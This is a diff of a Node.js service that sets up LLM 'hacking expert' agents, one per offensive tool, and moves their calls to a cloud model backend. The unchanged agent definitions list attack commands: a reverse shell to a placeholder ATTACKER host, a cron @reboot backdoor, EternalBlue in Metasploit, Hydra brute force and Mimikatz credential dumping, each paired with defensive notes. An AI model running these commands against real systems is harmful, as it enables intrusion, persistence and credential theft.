@@ -1,27 +1,26 @@
 /**
- * Hacking Expert Agents Service
+ * Hacking Expert Agents Service - Cloud Enabled
  * Agents spécialisés par outil/technique de hacking avec entraînement continu
- * Chaque agent devient EXPERT de son outil/technique spécifique
- * ENVIRONNEMENT: Kali Linux 2024.1
+ * Utilise LLM Cloud pour l'analyse
  */
 
 const fs = require('fs');
 const path = require('path');
-const { GoogleGenerativeAI } = require('@google/generative-ai');
 const KALI_ENVIRONMENT = require('./config/kali_environment');
+const LLMService = require('./llm_service');
 
 class HackingExpertAgentsService {
     constructor() {
-        this.ollamaUrl = process.env.OLLAMA_URL || 'http://localhost:11434';
         this.dataPath = path.join(__dirname, 'data', 'hacking_experts');
         this.model = 'gemini-3-pro-preview';
-        this.fallbackModel = 'gemini-3-pro-preview';
         this.kaliEnv = KALI_ENVIRONMENT;
+
+        this.llmService = new LLMService();
 
         this.ensureDataFolder();
         this.initializeAgents();
 
-        console.log(`[HACKING-EXPERTS] Service initialized with ${Object.keys(this.agents).length} tool experts on ${this.kaliEnv.os}`);
+        console.log(`[HACKING-EXPERTS] Service initialized (Cloud Mode) with ${Object.keys(this.agents).length} experts`);
     }
 
     ensureDataFolder() {
@@ -43,6 +42,7 @@ class HackingExpertAgentsService {
                 emoji: '🔬',
                 category: 'Reconnaissance',
                 tool: 'Nmap',
+                provider: 'gemini',
                 description: 'Expert en scanning réseau, découverte de ports et services',
                 commands: [
                     'nmap -sS -sV -O target',
@@ -65,6 +65,7 @@ DÉFENSE: Comment détecter chaque type de scan, IDS/IPS bypass`
                 emoji: '⚡',
                 category: 'Reconnaissance',
                 tool: 'Masscan',
+                provider: 'gemini',
                 description: 'Expert en scan ultra-rapide Internet-scale',
                 commands: [
                     'masscan -p80,443 10.0.0.0/8 --rate 10000',
@@ -87,6 +88,7 @@ DÉFENSE: Rate limiting, firewall rules, traffic analysis`
                 emoji: '💉',
                 category: 'Exploitation',
                 tool: 'Metasploit Framework',
+                provider: 'gemini',
                 description: 'Expert en exploitation automatisée et payloads',
                 commands: [
                     'use exploit/windows/smb/ms17_010_eternalblue',
@@ -109,6 +111,7 @@ DÉFENSE: Détection signatures, behavioral analysis, EDR bypass`
                 emoji: '💾',
                 category: 'Web Exploitation',
                 tool: 'SQLMap',
+                provider: 'gemini',
                 description: 'Expert en injection SQL automatisée',
                 commands: [
                     'sqlmap -u "http://target/page?id=1" --dbs',
@@ -131,6 +134,7 @@ DÉFENSE: Parameterized queries, WAF rules, input validation`
                 emoji: '🔧',
                 category: 'Web Security',
                 tool: 'Burp Suite',
+                provider: 'gemini',
                 description: 'Expert en test de sécurité web',
                 commands: [
                     'Burp: Proxy > Intercept > Forward/Drop',
@@ -155,6 +159,7 @@ DÉFENSE: Identifier les scans Burp, WAF tuning`
                 emoji: '🐉',
                 category: 'Password Attacks',
                 tool: 'THC Hydra',
+                provider: 'gemini',
                 description: 'Expert en brute-force de services réseau',
                 commands: [
                     'hydra -l admin -P wordlist.txt ssh://target',
@@ -175,6 +180,7 @@ DÉFENSE: Fail2ban, account lockout, rate limiting, MFA`
                 emoji: '🔓',
                 category: 'Password Cracking',
                 tool: 'Hashcat',
+                provider: 'gemini',
                 description: 'Expert en cracking GPU de hashes',
                 commands: [
                     'hashcat -m 0 hash.txt wordlist.txt',
@@ -196,6 +202,7 @@ DÉFENSE: Bcrypt/Argon2, key stretching, salting`
                 emoji: '🗝️',
                 category: 'Password Cracking',
                 tool: 'John the Ripper',
+                provider: 'gemini',
                 description: 'Expert en cracking CPU multi-format',
                 commands: [
                     'john --wordlist=rockyou.txt hashes.txt',
@@ -219,6 +226,7 @@ DÉFENSE: Strong hashing (bcrypt, Argon2), password policies`
                 emoji: '🦈',
                 category: 'Network Analysis',
                 tool: 'Wireshark/Tshark',
+                provider: 'gemini',
                 description: 'Expert en analyse de paquets et protocoles',
                 commands: [
                     'tshark -i eth0 -w capture.pcap',
@@ -239,6 +247,7 @@ DÉFENSE: Détecter anomalies, traffic patterns suspects`
                 emoji: '📡',
                 category: 'Network Attacks',
                 tool: 'Responder/LLMNR',
+                provider: 'gemini',
                 description: 'Expert en poisoning LLMNR/NBT-NS',
                 commands: [
                     'responder -I eth0 -wrf',
@@ -258,6 +267,7 @@ DÉFENSE: Disable LLMNR/NBT-NS, SMB signing, segmentation`
                 emoji: '🕵️',
                 category: 'Network Attacks',
                 tool: 'mitmproxy/Ettercap',
+                provider: 'gemini',
                 description: 'Expert en attaques Man-in-the-Middle',
                 commands: [
                     'mitmproxy -p 8080',
@@ -280,6 +290,7 @@ DÉFENSE: ARP inspection, HTTPS everywhere, certificate pinning`
                 emoji: '🐚',
                 category: 'Shells',
                 tool: 'Reverse Shells',
+                provider: 'gemini',
                 description: 'Expert en shells reverse et bind',
                 commands: [
                     'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1',
@@ -300,6 +311,7 @@ DÉFENSE: Egress filtering, network monitoring, YARA rules`
                 emoji: '🔗',
                 category: 'Post-Exploitation',
                 tool: 'Persistence Techniques',
+                provider: 'gemini',
                 description: 'Expert en maintien d\'accès',
                 commands: [
                     'crontab -e: @reboot /path/to/backdoor',
@@ -323,6 +335,7 @@ DÉFENSE: Autoruns analysis, EDR, integrity monitoring`
                 emoji: '🐧',
                 category: 'Privilege Escalation',
                 tool: 'Linux PrivEsc',
+                provider: 'gemini',
                 description: 'Expert en élévation de privilèges Linux',
                 commands: [
                     'sudo -l',
@@ -344,6 +357,7 @@ DÉFENSE: Least privilege, sudo audit, kernel updates`
                 emoji: '🪟',
                 category: 'Privilege Escalation',
                 tool: 'Windows PrivEsc',
+                provider: 'gemini',
                 description: 'Expert en élévation de privilèges Windows',
                 commands: [
                     'whoami /priv',
@@ -368,6 +382,7 @@ DÉFENSE: UAC, AppLocker, credential guard, LAPS`
                 emoji: '📶',
                 category: 'Wireless',
                 tool: 'Aircrack-ng Suite',
+                provider: 'gemini',
                 description: 'Expert en attaques WiFi',
                 commands: [
                     'airmon-ng start wlan0',
@@ -392,6 +407,7 @@ DÉFENSE: WPA3, strong passwords, client isolation, IDS`
                 emoji: '🩸',
                 category: 'Active Directory',
                 tool: 'BloodHound',
+                provider: 'gemini',
                 description: 'Expert en cartographie AD et chemins d\'attaque',
                 commands: [
                     'bloodhound-python -d domain.local -u user -p pass -c All',
@@ -412,6 +428,7 @@ DÉFENSE: Tiered model, least privilege, monitoring`
                 emoji: '📦',
                 category: 'Active Directory',
                 tool: 'Impacket',
+                provider: 'gemini',
                 description: 'Expert en outils réseau Python AD',
                 commands: [
                     'psexec.py domain/user:pass@target',
@@ -431,6 +448,7 @@ DÉFENSE: SMB signing, credential guard, segmentation`
                 emoji: '🎭',
                 category: 'Credential Attacks',
                 tool: 'Mimikatz',
+                provider: 'gemini',
                 description: 'Expert en extraction de credentials Windows',
                 commands: [
                     'sekurlsa::logonpasswords',
@@ -486,7 +504,7 @@ DÉFENSE: Credential Guard, Protected Users, LSA protection`
         const agent = this.agents[agentId];
         if (!agent) throw new Error(`Hacking Expert "${agentId}" not found`);
 
-        console.log(`[HACKING-EXPERTS] ${agent.emoji} ${agent.name} analyzing...`);
+        console.log(`[HACKING-EXPERTS] ${agent.emoji} ${agent.name} analyzing (via Gemini)...`);
 
         // Construire le contexte avec les connaissances apprises
         let learnedContext = '';
@@ -517,62 +535,16 @@ Réponds en EXPERT ${agent.tool} sur Kali Linux. Donne:
 3. Comment le défenseur peut détecter/bloquer
 4. Code si applicable`;
 
-        // Check for Gemini model
-        if (this.model.startsWith('gemini')) {
-            try {
-                const settings = require('./settings_service').getSettings();
-                const apiKey = process.env.GEMINI_API_KEY || settings.apiKeys?.gemini;
-
-                if (apiKey) {
-                    const genAI = new GoogleGenerativeAI(apiKey);
-                    const model = genAI.getGenerativeModel({
-                        model: this.model,
-                        systemInstruction: `${this.kaliEnv.getSystemPrompt()}\n${agent.systemPrompt}`
-                    });
-
-                    const result = await model.generateContent(
-                        `OUTIL: ${agent.tool}\nCOMMANDES DE RÉFÉRENCE:\n${agent.commands.map(c => `- ${c}`).join('\n')}\n${learnedContext}\n\n${context}\n\nQUESTION/TÂCHE: ${question}\n\nRéponds en EXPERT ${agent.tool} sur Kali Linux.`
-                    );
-                    const response = result.response.text();
-                    return this.processResponse(agent, agentId, question, response, this.model);
-                }
-                console.warn('[HACKING-EXPERTS] Gemini key missing, falling back to Ollama');
-            } catch (error) {
-                console.error('[HACKING-EXPERTS] Gemini error:', error.message);
-                // Fallthrough to Ollama
-            }
-        }
-
         try {
-            const response = await fetch(`${this.ollamaUrl}/api/generate`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    model: this.model, // This might fail if still gemini and fallthrough happened
-                    prompt: fullPrompt,
-                    stream: false,
-                    options: { temperature: 0.4, num_predict: 2500 }
-                })
-            });
+            const response = await this.llmService.generateResponse(
+                fullPrompt,
+                null,
+                agent.provider || 'gemini',
+                this.model,
+                'Tu es un expert en Hacking Éthique et Sécurité sur Kali Linux.'
+            );
 
-            if (!response.ok) {
-                // Fallback
-                const fallbackResponse = await fetch(`${this.ollamaUrl}/api/generate`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        model: 'granite-flash:latest', // Force local fallback
-                        prompt: fullPrompt,
-                        stream: false,
-                        options: { temperature: 0.4, num_predict: 2500 }
-                    })
-                });
-                const data = await fallbackResponse.json();
-                return this.processResponse(agent, agentId, question, data.response, 'granite-flash:latest');
-            }
-
-            const data = await response.json();
-            return this.processResponse(agent, agentId, question, data.response, this.model);
+            return this.processResponse(agent, agentId, question, response, this.model);
 
         } catch (error) {
             console.error(`[HACKING-EXPERTS] ${agent.name} error:`, error.message);
